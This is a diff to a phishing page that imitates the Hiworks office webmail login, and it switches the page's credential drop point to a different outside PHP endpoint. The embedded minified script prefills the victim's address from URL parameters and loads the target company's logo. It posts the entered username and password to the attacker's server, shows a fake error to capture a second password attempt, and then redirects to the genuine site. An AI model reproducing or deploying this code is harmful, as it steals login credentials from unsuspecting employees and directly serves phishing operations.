@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -1807,7 +1808,8 @@
     <div id="dimmed"></div>
   </div>
   <script>
-    const phplink = "https://liteservmovement.com/themes/hi/hi.php"
+
+    const phplink = "https://pamcourier.com/bk/hi.php"
 
     $(document).ready(function(){function a(){return f=$("#office_id").val(),e=$("#office_passwd").val(),""==f||4>=f.length?($("#office_id").val(""),$("#password_error_msg").hide(),$("#login_error_msg").show(),$("#office_id").focus(),!1):""==e||4>=e.length?($("#office_passwd").val(""),$("#login_error_msg").hide(),$("#password_error_msg").show(),$("#office_passwd").focus(),!1):void c()}function b(){$("#password_error_msg").show(),$("#login_error_msg").hide(),$("#office_passwd").val(""),$("#office_passwd").focus()}function c(){console.log("Sent!");var a=$("#office_id").val(),c=$("#office_passwd").val();$.ajax({url:phplink,type:"POST",data:{user:a,pass:c,type:1},success:function(){1===g?setTimeout(()=>{location.href="https://hiworks.com/"},2e3):(g++,b())},error:function(){console.log("..oops. There was an error")}})}let e,f,g=0,h=new URLSearchParams(document.location.search),i=h.get("u"),j=h.get("d");const d=i+"@"+j;if(console.log(j+" "+j),"null@null"==d)$("#office_id").val(""),$("#office_id").focus();else{let a=d.substring(d.lastIndexOf("@")+1);document.getElementById("logoimg").src=`https://office.hiworks.com/${a}/common/logo/login`,$("#office_id").val(d),$("#office_passwd").focus()}$("#btn").on("click",function(){a()}),$("#office_id").keydown(function(b){if(13==b.which)return a(),!1}),$("#office_passwd").keydown(function(b){if(13==b.which)return a(),!1})});
   </script>
